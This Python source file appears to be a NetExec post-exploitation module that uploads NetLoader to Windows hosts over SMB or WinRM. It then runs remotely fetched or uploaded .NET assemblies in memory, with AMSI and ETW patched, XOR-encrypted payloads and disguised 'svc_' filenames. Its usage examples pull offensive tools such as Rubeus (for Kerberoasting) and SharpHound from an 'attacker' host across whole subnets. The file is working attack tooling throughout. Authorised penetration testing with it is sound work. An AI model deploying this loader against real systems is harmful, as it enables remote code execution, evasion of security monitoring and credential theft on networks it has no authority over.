# netload module for nxc
# author of the module : github.com/Squ1shification
# NetLoader: https://github.com/Flangvik/NetLoader

import base64
from io import BytesIO
from os.path import exists, join
from sys import exit as sys_exit

from nxc.helpers.misc import CATEGORY, gen_random_string
from nxc.paths import DATA_PATH


class NXCModule:
    """In-memory .NET assembly execution via NetLoader.

    Uploads NetLoader to a target, then uses it to fetch and execute a .NET
    assembly in-memory with AMSI and ETW patched. Supports XOR-encrypted
    payloads, local file uploads, and automatic cleanup.

    Module by @Squ1shification
    Based on NetLoader by @Flangvik
    """

    name = "netload"
    description = "In-memory .NET assembly execution via NetLoader with AMSI/ETW bypass"
    supported_protocols = ["smb", "winrm"]
    category = CATEGORY.PRIVILEGE_ESCALATION

    def __init__(self, context=None, module_options=None):
        self.context = context
        self.module_options = module_options
        self.url = None
        self.local = None
        self.args = ""
        self.xor_key = None
        self.loader_path = None
        self.cleanup = False
        self.timeout = 30
        self.upload_dir = "Windows\\Temp"
        self.loader_name = None

    def options(self, context, module_options):
        r"""
        URL             URL of the .NET assembly to load in-memory (use URL or LOCAL, not both)
        LOCAL           Local path to a .NET assembly on the attacking machine (uploaded then loaded)
        ARGS            Arguments passed to the loaded assembly (preserved as-is, no splitting)
        XOR_KEY         XOR decryption key if the payload is encrypted (optional)
        LOADER          Local path to a custom NetLoader binary (optional, bundled loader used by default)
        UPLOAD_DIR      Remote staging directory relative to C:\ (default: Windows\Temp)
        TIMEOUT         Command execution timeout in seconds (default: 30)
        CLEANUP         Remove any previously staged loaders from the target (skips execution)
        LOADER_NAME     Exact filename to remove during cleanup (if you lost the random name)

        Examples:
            nxc smb 10.0.0.0/24 -u admin -p Pass -M netload -o URL=http://attacker/Seatbelt.exe ARGS="-group=all"
            nxc smb dc01 -u admin -H <hash> -M netload -o URL=http://attacker/Rubeus.exe ARGS="kerberoast /nowrap"
            nxc smb target -u admin -p Pass -M netload -o LOCAL=/opt/SharpHound.exe ARGS="--collectionmethods All"
            nxc winrm target -u admin -p Pass -M netload -o URL=http://attacker/Rubeus.exe ARGS="asktgt /user:svc /rc4:abc123 /nowrap"
            nxc smb target -u admin -p Pass -M netload -o CLEANUP=True
        """
        if "CLEANUP" in module_options and module_options["CLEANUP"].lower() == "true":
            self.cleanup = True
            if "LOADER_NAME" in module_options:
                self.loader_name = module_options["LOADER_NAME"]
            return

        if "URL" not in module_options and "LOCAL" not in module_options:
            context.log.fail("URL or LOCAL option is required")
            sys_exit(1)

        if "URL" in module_options and "LOCAL" in module_options:
            context.log.fail("Specify URL or LOCAL, not both")
            sys_exit(1)

        if "URL" in module_options:
            self.url = module_options["URL"]

        if "LOCAL" in module_options:
            self.local = module_options["LOCAL"]

        if "ARGS" in module_options:
            self.args = module_options["ARGS"]

        if "XOR_KEY" in module_options:
            self.xor_key = module_options["XOR_KEY"]

        if "LOADER" in module_options:
            self.loader_path = module_options["LOADER"]

        if "UPLOAD_DIR" in module_options:
            raw = module_options["UPLOAD_DIR"]
            self.upload_dir = raw.strip("\\/").replace("/", "\\")

        if "TIMEOUT" in module_options:
            try:
                self.timeout = int(module_options["TIMEOUT"])
            except ValueError:
                context.log.fail(
                    f"TIMEOUT must be an integer, got: {module_options['TIMEOUT']}"
                )
                sys_exit(1)

    def _is_smb(self, connection):
        return hasattr(connection, "conn") and hasattr(connection.conn, "putFile")

    def on_admin_login(self, context, connection):
        if self.cleanup:
            self._cleanup(context, connection)
            return

        suffix = gen_random_string(8)
        loader_remote_name = f"svc_{suffix}.exe"

        if not self._upload_loader(context, connection, loader_remote_name):
            return

        payload_remote_name = None
        if self.local:
            payload_remote_name = f"dat_{suffix}.bin"
            if not self._upload_payload(context, connection, payload_remote_name):
                self._delete_file(context, connection, loader_remote_name)
                return

        target_path = self._build_target_path(payload_remote_name)
        cmd = self._build_command(loader_remote_name, target_path)

        context.log.info(f"Executing: {loader_remote_name} -> {target_path}")
        try:
            output = self._execute(connection, cmd)
            if output:
                output = output.strip()
                if self._is_clr_error(output):
                    context.log.fail(
                        "Assembly requires a .NET CLR version not installed on the target"
                    )
                    for line in output.splitlines()[:3]:
                        context.log.fail(f"  {line}")
                else:
                    for line in output.splitlines():
                        context.log.highlight(line)
        except Exception as e:
            err = str(e)
            if self._is_clr_error(err):
                context.log.fail(
                    "Assembly requires a .NET CLR version not installed on the target"
                )
            else:
                context.log.fail(f"Execution failed: {e}")

        if payload_remote_name:
            self._delete_file(context, connection, payload_remote_name)
        self._delete_file(context, connection, loader_remote_name)
        context.log.success("Staged files removed")

    def _is_clr_error(self, text):
        clr_markers = [
            "is not a valid Win32 application",
            "BadImageFormatException",
            "Could not load file or assembly",
            "requires a later version",
            "not a valid .NET assembly",
            "image is built for a",
            "CLR error",
            "Framework initialization error",
        ]
        return any(m.lower() in text.lower() for m in clr_markers)

    def _execute(self, connection, cmd):
        if self._is_smb(connection):
            return connection.execute(
                cmd, True, methods=["wmiexec", "atexec", "smbexec"]
            )
        return connection.execute(cmd, True)

    def _remote_path(self, filename):
        return f"{self.upload_dir}\\{filename}"

    def _full_path(self, filename):
        return f"C:\\{self.upload_dir}\\{filename}"

    def _upload_file(self, context, connection, data, remote_name):
        share_path = self._remote_path(remote_name)

        if self._is_smb(connection):
            connection.conn.putFile("C$", share_path, BytesIO(data).read)
        else:
            b64 = base64.b64encode(data).decode()
            full = self._full_path(remote_name)
            ps = f"[IO.File]::WriteAllBytes('{full}', [Convert]::FromBase64String('{b64}'))"
            connection.execute(ps, False, shell_type="powershell")

    def _upload_loader(self, context, connection, remote_name):
        if self.loader_path:
            loader_data = self._read_local_file(context, self.loader_path)
        else:
            loader_data = self._read_bundled_loader(context)

        if loader_data is None:
            return False

        try:
            self._upload_file(context, connection, loader_data, remote_name)
            context.log.success(f"Uploaded loader as {remote_name}")
        except Exception as e:
            context.log.fail(f"Failed to upload loader: {e}")
            return False
        return True

    def _upload_payload(self, context, connection, remote_name):
        payload_data = self._read_local_file(context, self.local)
        if payload_data is None:
            return False

        try:
            self._upload_file(context, connection, payload_data, remote_name)
            context.log.success(f"Uploaded payload as {remote_name}")
        except Exception as e:
            context.log.fail(f"Failed to upload payload: {e}")
            return False
        return True

    def _build_target_path(self, payload_remote_name):
        if self.url:
            return self.url
        return self._full_path(payload_remote_name)

    def _build_command(self, loader_name, target):
        loader_full = self._full_path(loader_name)
        cmd = f"{loader_full} -v -path {target}"

        if self.xor_key:
            cmd += f" -xor {self.xor_key}"

        if self.args:
            cmd += f" -args {self.args}"

        return cmd

    def _delete_file(self, context, connection, remote_name):
        try:
            if self._is_smb(connection):
                connection.conn.deleteFile("C$", self._remote_path(remote_name))
            else:
                connection.execute(f'del "{self._full_path(remote_name)}"', True)
        except Exception:
            context.log.debug(f"Could not delete {remote_name}")

    def _cleanup(self, context, connection):
        if self.loader_name:
            self._delete_file(context, connection, self.loader_name)
            context.log.success(f"Removed {self.loader_name}")
            return

        try:
            if self._is_smb(connection):
                files = connection.conn.listPath("C$", self._remote_path("svc_*.exe"))
                if not files:
                    context.log.info("No staged loaders found")
                    return
                for f in files:
                    fname = f.get_longname()
                    self._delete_file(context, connection, fname)
                    context.log.success(f"Removed {fname}")
            else:
                output = connection.execute(
                    f'cmd /c dir /b "C:\\{self.upload_dir}\\svc_*.exe" 2>nul',
                    True,
                )
                if not output or not output.strip():
                    context.log.info("No staged loaders found")
                    return
                for fname in output.strip().splitlines():
                    fname = fname.strip()
                    if fname:
                        self._delete_file(context, connection, fname)
                        context.log.success(f"Removed {fname}")
        except FileNotFoundError:
            context.log.info("No staged loaders found")
        except Exception as e:
            context.log.fail(f"Cleanup failed: {e}")

    def _read_local_file(self, context, path):
        try:
            with open(path, "rb") as f:
                return f.read()
        except FileNotFoundError:
            context.log.fail(f"File not found: {path}")
            return None
        except PermissionError:
            context.log.fail(f"Permission denied: {path}")
            return None

    def _read_bundled_loader(self, context):
        bundled = join(DATA_PATH, "netload_module", "NetLoader.exe")
        if not exists(bundled):
            context.log.fail(
                "No NetLoader binary found. Either:\n"
                "  1. Compile NetLoader and pass LOADER=/path/to/NetLoader.exe\n"
                "  2. Place NetLoader.exe in the nxc data directory under netload_module/"
            )
            return None

        try:
            with open(bundled, "rb") as f:
                return f.read()
        except Exception as e:
            context.log.fail(f"Failed to read bundled loader: {e}")
            return None
